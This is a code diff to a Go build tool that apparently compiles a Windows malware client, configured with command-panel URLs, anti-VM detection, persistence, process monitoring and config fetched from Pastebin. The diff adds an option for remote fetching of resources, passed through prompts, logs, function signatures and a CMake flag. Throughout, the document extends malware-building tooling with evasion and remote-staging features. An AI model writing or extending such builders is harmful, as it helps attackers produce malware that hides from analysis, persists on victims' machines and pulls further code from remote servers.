@@ -87,6 +87,7 @@ func buildClientNonInteractiveWindows() error {
 	debugConsole := *debugFlag
 	antiVM := *antiVMFlag
 	persistence := *persistenceFlag
+	fetch_embedded := *fetchEmbeddedFlag
 
 	urlCount := len(strings.Split(panelURL, ","))
 	logInfo("Using %d panel URL(s) with fallback support", urlCount)
@@ -97,8 +98,9 @@ func buildClientNonInteractiveWindows() error {
 	logInfo("  Debug Console: %v", debugConsole)
 	logInfo("  Anti-VM Detection: %v", antiVM)
 	logInfo("  Persistence: %v", persistence)
+	logInfo("  Fetch Embedded: %v", fetch_embedded)
 
-	return executeBuildWindows(panelURL, "", false, processMonitoring, debugConsole, antiVM, persistence)
+	return executeBuildWindows(panelURL, "", false, processMonitoring, debugConsole, antiVM, persistence, fetch_embedded)
 }
 
 // buildClientWindows orchestrates the full build pipeline for Windows
@@ -178,6 +180,10 @@ func buildClientWindows() error {
 	persistenceInput, _ := reader.ReadString('\n')
 	persistence := strings.TrimSpace(persistenceInput) == "y"
 
+	fmt.Print("Enable Remote Fetching of Resources (Smaller Binary)? (y/n): ")
+	remoteFetchInput, _ := reader.ReadString('\n')
+	fetch_embedded := strings.TrimSpace(remoteFetchInput) == "y"
+
 	logInfo("\n[BUILD CONFIGURATION]")
 	if useGetConfig {
 		logInfo("Config Method: GET request from Pastebin/endpoint")
@@ -190,12 +196,13 @@ func buildClientWindows() error {
 	logInfo("Debug Console: %v", debugConsole)
 	logInfo("  Anti-VM Detection: %v", antiVM)
 	logInfo("  Persistence: %v", persistence)
+	logInfo("  fetch_embedded: %v", fetch_embedded)
 
-	return executeBuildWindows(panelURL, configURL, useGetConfig, processMonitoring, debugConsole, antiVM, persistence)
+	return executeBuildWindows(panelURL, configURL, useGetConfig, processMonitoring, debugConsole, antiVM, persistence, fetch_embedded)
 }
 
 // executeBuildWindows performs the actual build process on Windows
-func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonitoring, debugConsole, antiVM, persistence bool) error {
+func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonitoring, debugConsole, antiVM, persistence, fetch_embedded bool) error {
 	// Clean build directory first to ensure no stale CMake cache or files
 	logInfo("Cleaning build directory: %s", buildDir)
 	if err := os.RemoveAll(buildDir); err != nil {
@@ -274,7 +281,7 @@ func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonito
 
 	// Run CMake
 	logInfo("Configuring project with CMake...")
-	if err := runCMakeWindows(configURL, antiVM, persistence, debugConsole); err != nil {
+	if err := runCMakeWindows(configURL, antiVM, persistence, fetch_embedded, debugConsole); err != nil {
 		return fmt.Errorf("CMake configuration failed: %v", err)
 	}
 
@@ -314,7 +321,7 @@ func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonito
 }
 
 // runCMakeWindows runs CMake for Windows with Visual Studio generator
-func runCMakeWindows(configURL string, antiVM bool, persistence bool, debugConsole bool) error {
+func runCMakeWindows(configURL string, antiVM bool, persistence bool, fetch_embedded bool, debugConsole bool) error {
 	// List of generators to try in order
 	generators := []string{
 		"Visual Studio 17 2022",
@@ -343,6 +350,10 @@ func runCMakeWindows(configURL string, antiVM bool, persistence bool, debugConso
 
 		if configURL != "" {
 			args = append(args, "-DCONFIG_GET_URL="+configURL)
+		}
+
+		if fetch_embedded {
+			args = append(args, "-DENABLE_FETCH_EMBEDDED=ON")
 		}
 
 		args = append(args, "..")
